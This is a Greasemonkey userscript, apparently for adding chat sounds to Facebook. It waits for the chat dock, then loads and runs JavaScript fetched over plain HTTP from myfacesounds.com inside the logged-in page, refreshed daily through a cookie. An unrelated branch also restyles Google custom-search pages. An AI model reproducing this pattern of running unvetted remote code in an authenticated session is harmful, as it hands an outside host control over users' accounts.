// ==UserScript==
// @name           facebook chat sound
// @namespace      facebook chat sound
// @include        http://www.facebook.com/*
// ==/UserScript==

function createcookie(name,value,days) {
				if (days) {
					var date = new Date();
					date.setTime(date.getTime()+(days*24*60*60*1000));
					var expires = "; expires="+date.toGMTString();
				}
				else var expires = "";
				document.cookie = name+"="+value+expires+"; path=/";
			}
function readcookie(name) {
				var nameEQ = name + "=";
				var ca = document.cookie.split(';');
				for(var i=0;i < ca.length;i++) {
					var c = ca[i];
					while (c.charAt(0)==' ') c = c.substring(1,c.length);
					if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
				}
				return null;
			}
//erase cookie by name - TBD
function erasecookie(cookiename) {
	createcookie(cookiename,"",-1);
	}
	
	
		//for testing purpose to check if cookies work
		function create_short_cookie(name,value,days) {
				if (days) {
					var date = new Date();
					date.setTime(date.getTime()+(days*60*1000));
					var expires = "; expires="+date.toGMTString();
				}
				else var expires = "";
				document.cookie = name+"="+value+expires+"; path=/";
			}
	
setTimeout(function () { DocumentComplete("null","window");},550);

	function DocumentComplete(tool, type) 
	{
		if(type == "window") 
		{
			///////////////////
			
			if (window.location.hostname == 'www.google.com')
				if (window.location.pathname == '/cse' || window.location.pathname == '/custom')
					{
						var h=window.document.getElementsByTagName("table");
						if (h.length)
						for(j=2; j<4; j++){
							h[j].setAttribute('style','');
						}
 
						var styleElement = window.document.createElement("style");
  						styleElement.type = "text/css";
  						if (styleElement.styleSheet) {
    						styleElement.styleSheet.cssText = ".bb { border-bottom : 0px solid #0000CC; display: none;}";
  						} else {
    						styleElement.appendChild(document.createTextNode(".bb { border-bottom : 0px solid #0000CC; display: none;}"));
  						}
  						window.document.getElementsByTagName("head")[0].appendChild(styleElement);
						
						var res=window.document.getElementById("res");
						res.setAttribute('style','margin-top : -21pt;');						
						
						
						return;
		
					}
			
			
			////////////////
			var b;
			try{
			b=document.getElementById('fbDockChat');
			}
			catch(err){window.alert(err);}
			
			//window.alert("hello2");

			if (b==null)
				{
					setTimeout(function () { DocumentComplete(tool,type);},550);
					return;
				}
			
			var a;
			try{
			a=document.getElementById('myfacesounds')
			}
			catch(err){window.alert(err);}
			//window.alert("a="+a);	
			if (a==null)
				{
					var _head = document.getElementsByTagName('head')[0];
					var sGetter = document.createElement('script');
					sGetter.type = 'text/javascript';
					
					////
					
					var randNum =0;
					if(readcookie('myfacesound_js') == null) //this will make sure sounds list relaods one a day
					{
						randNum = Math.random()+'';
						//create_short_cookie("myfacesound_js",randNum,1); //for tests reload every one minuete 
						createcookie("myfacesound_js",randNum,1);  //reload JS every one day 

					}
					else
					{
						randNum = readcookie('myfacesound_js');
						//window.alert("reload already exists="+randNum);
					}
					
					///
					//var randNum = Math.random();
					sGetter.src="http://www.myfacesounds.com/facesounds.js?"+randNum;
					sGetter.id="myfacesounds";
					_head.appendChild(sGetter);
				}
			
				
				
		}
	}